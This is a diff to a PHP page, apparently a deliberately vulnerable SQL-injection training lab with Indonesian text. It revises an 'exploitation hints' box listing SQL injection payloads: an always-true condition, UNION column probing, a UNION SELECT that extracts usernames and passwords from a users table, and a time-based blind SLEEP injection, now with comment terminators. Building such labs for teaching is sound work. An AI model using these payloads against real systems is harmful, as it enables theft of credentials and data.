@@ -147,10 +147,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         </form>
         <div class="hint">
             <strong>Petunjuk Eksploitasi:</strong><br>
-            • Coba: <code>1' OR '1'='1</code> - tampilkan semua surat<br>
-            • Coba: <code>1' UNION SELECT 1,2,3,4</code> - uji kolom UNION<br>
-            • Coba: <code>1' UNION SELECT username, password, 3, created_at FROM users</code> - ekstrak data user<br>
-            • Coba: <code>1 AND SLEEP(5)</code> - SQLi blind berbasis waktu
+            • Coba: <code>1' OR '1'='1' #</code> - tampilkan semua surat<br>
+            • Coba: <code>1' UNION SELECT 1,2,3,4 #</code> - uji kolom UNION<br>
+            • Coba: <code>1' UNION SELECT username,password,3,created_at FROM users #</code> - ekstrak data user<br>
+            • Coba: <code>1' AND SLEEP(5) #</code> - SQLi blind berbasis waktu (response delay 5 detik)<br>
+            • Alternative: Gunakan <code>--+</code> atau <code>#</code> untuk SQL comment
         </div>
         
         <?php if ($error): ?>
